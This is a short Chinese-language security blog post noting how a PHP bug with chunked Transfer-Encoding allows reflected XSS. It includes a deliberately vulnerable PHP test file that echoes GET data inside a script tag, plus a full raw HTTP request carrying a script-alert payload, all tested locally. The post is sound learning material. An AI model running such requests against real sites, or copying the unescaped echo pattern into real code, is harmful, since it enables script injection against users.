---
layout:     post
title:      有趣的XSS小记
subtitle:   
date:       2018-09-17
author:     sp4rk
header-img: 
catalog: true
tags:
    - xss
---



## 0x01 随便说说

早就想更博客了，有点懒就一直没写，最近在进一步的学习网络协议相关的东西，前两天在推特上发现一个有趣的东西，顺便学习了一下http Transfer-Encoding，这里简单的mark记录一下。

## 0x02 记录

前两天看到一篇推特如下：

![](https://tva1.sinaimg.cn/large/006y8mN6ly1g7fc393ltuj30oh07y0te.jpg)



这里本地先尝试了一下：

```php
//testbug1.php
<script>var x=<?=json_encode($_GET)?>;</script>
```

![](https://tva1.sinaimg.cn/large/006y8mN6ly1g7fc3ck6nyj30zf0ipq8r.jpg)

感觉这个好像不可能有XSS，那么既然都发出来了，肯定是能XSS的。。。于是网上搜了下，发现是一个PHP的bug：

[XSS due to the header Transfer-Encoding: chunked](https://bugs.php.net/bug.php?id=76582)

![](https://tva1.sinaimg.cn/large/006y8mN6ly1g7fc3jlksgj30v80iwgpc.jpg)

这个的大致意思就是说可以利用http的分块编码(chunked)来进行操作，那么chunked这个编码是做什么的呢？它主要是为了解决网络文件等不好获取实体长度的文件的问题，通过使用分块传输编码，数据分解成一系列数据块，并以一个或多个块发送，这样服务器可以发送数据而不需要预先知道发送内容的总大小。
这里将请求包改为POST，加入该字段，再插入XSS就行了。

```html
POST /testbug1.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Transfer-Encoding: chunked
Content-Length: 25

<script>alert(1)</script>
```

![](https://tva1.sinaimg.cn/large/006y8mN6ly1g7fc3pn0xej30zc0iltei.jpg)